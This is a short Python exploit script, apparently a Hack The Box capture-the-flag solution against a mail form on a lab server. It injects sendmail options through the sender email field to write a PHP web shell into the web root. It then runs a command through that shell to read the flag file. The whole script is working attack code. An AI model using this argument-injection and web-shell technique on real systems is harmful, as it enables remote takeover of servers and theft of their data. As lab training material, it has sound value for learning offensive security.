import requests, random
from re import findall as ff

target = '178.62.104.23:31175'
webshell = f'wbshl_{random.randint(1,10000)}.php'
data = f'-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"from_email\"\x0d\x0a\x0d\x0arelations@moi.gov.htb -OQueueDirectory=/tmp -X/var/www/html/{webshell}\x0d\x0a-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"from_name\"\x0d\x0a\x0d\x0aMinistry\x0d\x0a-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"subject\"\x0d\x0a\x0d\x0a<?php echo shell_exec($_GET[\'cmd\']);?>\x0d\x0a-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"email_body\"\x0d\x0a\x0d\x0atesttesttestaaaaaaaaaa\x0d\x0a-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"email_list\"\x0d\x0a\x0d\x0afoo@bar.com\x0d\x0ads.cherry@moi.gov.htb\x0d\x0a-----------------------------303018965816138074393654457873\x0d\x0aContent-Disposition: form-data; name=\"attachment\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------303018965816138074393654457873--\x0d\x0a'
headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------303018965816138074393654457873'}
r1 = requests.post(f'http://{target}/mailer.php', data=data, headers=headers)
print(f'[+] Uploaded webshell at /{webshell}. Use ?cmd=COMMAND to run commands')
r2 = requests.get(f'http://{target}/{webshell}?cmd=cat /flag.txt')
print('[+] Flag: ' + ff('HTB.*\}',r2.text)[0])